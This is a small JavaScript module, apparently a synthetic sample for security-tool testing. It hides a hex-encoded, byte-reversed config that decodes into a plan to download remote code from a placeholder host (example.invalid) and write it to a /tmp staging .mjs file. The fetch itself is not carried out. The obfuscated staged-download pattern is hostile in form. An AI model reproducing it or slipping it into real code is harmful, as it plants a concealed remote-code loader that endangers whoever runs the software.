const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_2ba88a3a = "736a6d2e6534363464323234383662612d65676174732e2f65646f6e2d73736572746e75682f706d742f3d687461705f656c69667c383662612f746964754165646f4e3d746e6567615f726573757c6970612f64696c61766e692e656c706d6178652e6534363464323234383662612d65646f6e2f2f3a73707474683d6c72757c44323234383642412d45444f4e3d64695f6e676961706d61637c313d746e756f635f65676174737c6d61657274735f6f745f707474683d726574706164617c656c69665f65746972772c65746f6d65725f657269757163613d73706574737c313d76";
const Codec_2ba88a3a = "hex_buffer|reverse_bytes|";

function load_2ba88a3a() { return [...Buffer.from(Material_2ba88a3a, "hex")]; }
function decode_2ba88a3a(item1) { return [...item1].reverse(); }
async function recover_2ba88a3a() {
  const item3 = "";
  const item1 = load_2ba88a3a(); let item2 = [];
  switch (1) { case 1: item2 = decode_2ba88a3a(item1); break; default: throw new Error("state"); }
  void item3; return Buffer.from(item2).toString("ascii");
}
async function inspect_2ba88a3a() { return await recover_2ba88a3a(); }
async function plan_2ba88a3a() { const inspect = inspect_2ba88a3a; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_2ba88a3a;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_2ba88a3a());
